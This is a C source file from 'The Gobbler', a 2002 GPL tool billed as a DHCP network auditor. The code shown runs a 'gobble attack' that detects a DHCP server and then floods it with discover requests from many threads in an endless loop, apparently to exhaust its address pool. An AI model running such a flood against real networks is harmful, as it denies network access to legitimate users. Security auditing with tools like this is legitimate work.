/*The Gobbler - A tool to audit DHCP networks
 *Copyright (C) 2002 Steven Jones root@networkpenetration.com
 *www.networkpenetration.com
 *
 *This program is free software; you can redistribute it and/or
 *modify it under the terms of the GNU General Public License
 *as published by the Free Software Foundation; either version 2
 *of the License, or (at your option) any later version.
 *
 *This program is distributed in the hope that it will be useful,
 *but WITHOUT ANY WARRANTY; without even the implied warranty of
 *MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *GNU General Public License for more details.
 *
 *You should have received a copy of the GNU General Public License
 *along with this program; if not, write to the Free Software
 *Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
*/

#include "gobbler.h"

extern int dhcpdetected;
extern void startdhcpdiscover(void);
extern void* status;
extern int dhcpgobblestarted;
extern int dhcpgobbling;
extern int tempsleep;
extern u_int sleeparg;
extern int nodetect;
int dhcpreplyinfo = 0;

void startdhcpgobble(void)
{
	void thread_dhcpgobble(int);
	int i;
	
	printf("Detecting DHCP service for gobble attack\n");
	dhcpgobblestarted = 1;
	dhcpreplyinfo = 1;
	dhcpgobbling = 1;
	startdhcpdiscover();
	dhcpreplyinfo = 0;
	
	if(!dhcpdetected){
		printf("Opps: DHCP serivce not detected\n");
		exit(1);
	}
	
	gptr = calloc(MAXGOBHANDLER, sizeof(gthread));
	for(i=0; i<MAXGOBHANDLER; i++){
		thread_dhcpgobble(i);
	}
}

void thread_dhcpgobble(int i)
{
	void dhcpgobble(void *);
	
	for(;;){
		if(tempsleep) {
			sleep(tempsleep); //lame error recovery
			tempsleep = 0;
		}
		
		if(sleeparg){
			usleep(sleeparg);
		}
		else usleep(75000); //packet gap..... seems about right didn;t crash against class B
	
		if(pthread_create(&gptr[i].thread_tid, NULL,(void *) &dhcpgobble, (void *) i) < 0){
			printf("Opps: pthread_create error\n");
			exit(1);
		}
	}
}


void dhcpgobble(void *tnum)
{
	if(v>2)printf("Gobbler started on thread(%ld)\n", pthread_self());
	pthread_detach(pthread_self());	
	startdhcpdiscover(); //saves recoding whole chuncks of code //startdhcpdiscover
	pthread_exit(&status);
}
